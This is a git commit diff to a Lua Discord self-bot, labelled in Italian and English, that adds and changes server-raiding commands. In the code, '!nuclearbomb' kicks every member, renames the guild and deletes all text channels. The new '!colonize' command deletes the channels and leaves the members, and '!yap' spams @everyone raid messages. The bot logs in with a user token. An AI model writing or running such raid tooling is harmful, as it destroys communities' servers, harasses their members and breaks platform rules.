85503620e26494e4d66280c56c09d494f5106151
pizzawizard <pizzawizard32@tuxzilla.com>
2026-04-21 19:33:49 +0200

    new stuff

--- main.lua
+++ main.lua
@@ -3,6 +3,7 @@ local client = discordia.Client()
 discordia.extensions.string()
 math.randomseed(os.time())
 
+local responsibleRaiderName = "carota"
 local echomsg = "@everyone\nQUESTO MESSAGGIO E' STATO MANDATO DA VERI PATRIOTTICI DELLA REPUBBLICA FEDERALE POPOLARE DI CAROTA.\nTHIS MESSAGE HAS BEEN SENT BY REAL PATRIOTS FROM THE PEOPLE'S FEDERAL REPUBLIC OF CAROTA.\n"
 local imagelink = "https://files.catbox.moe/44w4wc.png"
 
@@ -30,25 +31,27 @@ client:on('messageCreate', function(msg)
 		until raid == false
 	elseif lower == '!nuclearbomb' then
 		for i, member in pairs(msg.guild.members:toArray()) do
-			if member.user.id ~= 1449521705524396125 or member.user.id ~= 697150884047749121 then
-				msg.guild:kickUser(member.user.id)
-			end
+			msg.guild:kickUser(member.user.id)
 		end
-		msg.channel.guild:setName(msg.channel.guild.name.." // carota")
+		msg.channel.guild:setName(msg.channel.guild.name.." // "..responsibleRaiderName)
 		for i, channel in pairs(msg.guild.textChannels:toArray()) do
 			channel:delete()
 		end
-		msg.channel.guild:createTextChannel("carota")
+		msg.channel.guild:createTextChannel(responsibleRaiderName)
+	elseif lower == '!colonize' then
+		msg.channel.guild:setName(msg.channel.guild.name.." // "..responsibleRaiderName)
+		for i, channel in pairs(msg.guild.textChannels:toArray()) do
+			channel:delete()
+		end
+		msg.channel.guild:createTextChannel(responsibleRaiderName)
 	elseif lower == "!encmdlist" then
-		msg:reply(">>> # COMMAND LIST\n**!yap** - raid a server channel (can get your account banned)\n**!nuclearbomb** - nuke the server (experimental)\n**!roll** - send a random number in chat")
+		msg:reply(">>> # COMMAND LIST\n**!yap** - raid a server channel (can get your account banned)\n**!nuclearbomb** - nuke the server (experimental)\n**!colonize** - nukes the server without removing members\n**!shutup** - pauses the raid\n**!roll** - send a random number in chat")
 	elseif lower == "!itcmdlist" then
-		msg:reply(">>> # LISTA DEI COMANDI\n**!yap** - raida un canale del server (può portare a un ban)\n**!nuclearbomb** - nukka il server (sperimentale)\n**!roll** - spara un numero a caso in chat")
+		msg:reply(">>> # LISTA DEI COMANDI\n**!yap** - raida un canale del server (può portare a un ban)\n**!nuclearbomb** - nukka il server (sperimentale)\n**!colonize** - nukka il server senza togliere membri\n**!shutup** - mette in pausa la raid\n**!roll** - spara un numero a caso in chat")
 	elseif lower == "!roll" then
 		local number = math.random(0, 432478421379487231944312431211111)
 		msg:reply(">>> # RESULT/RISULTATO\nE' uscito il numero **"..number.."**!\nYou've got the number **"..number.."**!")
 	end
-
-	print("@"..msg.author.tag..": "..msg.content)
 end)
 
 client:run("USER_TOKEN")
